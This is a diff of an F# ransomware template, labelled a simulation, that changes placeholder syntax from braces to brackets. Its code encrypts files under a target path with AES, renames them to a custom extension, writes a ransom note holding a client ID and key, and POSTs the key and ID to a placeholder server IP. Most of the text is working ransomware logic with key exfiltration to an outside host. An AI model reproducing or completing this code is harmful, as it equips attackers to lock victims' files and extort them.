@@ -16,12 +16,12 @@ let generateAesKeyAndIv () =
 let generateClientId () =
     Guid.NewGuid().ToString("N")
 
-// Function to encrypt a file using AES and change its extension to {CUSTOM_EXTENSION}
+// Function to encrypt a file using AES and change its extension to [CUSTOM_EXTENSION]
 let encryptFile (filePath: string, key: byte[], iv: byte[]) =
     let aes = Aes.Create()
     aes.Key <- key
     aes.IV <- iv
-    let encryptedFilePath = Path.ChangeExtension(filePath, "{CUSTOM_EXTENSION}")
+    let encryptedFilePath = Path.ChangeExtension(filePath, "[CUSTOM_EXTENSION]")
     use fsInput = new FileStream(filePath, FileMode.Open, FileAccess.Read)
     use fsOutput = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write)
     use cryptoStream = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write)
@@ -35,20 +35,20 @@ let encryptFile (filePath: string, key: byte[], iv: byte[]) =
 
 // Function to add the note.txt file with client ID and decryption info
 let addNoteFile (directoryPath: string, clientId: string, decryptionKey: string, iv: string) =
-    let noteContent = "{MESSAGE}\nYour client ID is: {CLIENT_ID}\nDecryption Key: {DECRYPTION_KEY}\nIV: {IV}"
-    File.WriteAllText(Path.Combine(directoryPath, "{NOTE_FILE}"), noteContent)
+    let noteContent = "[MESSAGE]\nYour client ID is: [CLIENT_ID]\nDecryption Key: [DECRYPTION_KEY]\nIV: [IV]"
+    File.WriteAllText(Path.Combine(directoryPath, "[NOTE_FILE]"), noteContent)
     printfn "Note added to: %s" directoryPath
 
 // Function to send the decryption key and client ID to a server as a backup
 let sendDecryptionKeyToServer (clientId: string, decryptionKey: string, iv: string) =
     let client = new HttpClient()
     let content = new StringContent($"Client ID: {clientId}\nKey: {decryptionKey}\nIV: {iv}")
-    let result = client.PostAsync("http://{SERVER_IP}/storekey", content).Result
+    let result = client.PostAsync("http://[SERVER_IP]/storekey", content).Result
     printfn "Client ID {clientId} and decryption key sent to server"
 
 // Function to check if the file extension is sensitive
 let isSensitiveFile (filePath: string) =
-    let sensitiveExtensions = [{EXCLUDE_EXTENSIONS}]
+    let sensitiveExtensions = [[EXCLUDE_EXTENSIONS]]
     let ext = Path.GetExtension(filePath).ToLower()
     sensitiveExtensions |> List.contains ext
 
@@ -65,4 +65,4 @@ let simulateRansomware (directoryPath: string) =
     addNoteFile(directoryPath, clientId, keyBase64, ivBase64)
     sendDecryptionKeyToServer(clientId, keyBase64, ivBase64)
 
-simulateRansomware "{PATH_TO_ENCRYPT}"
+simulateRansomware "[PATH_TO_ENCRYPT]"
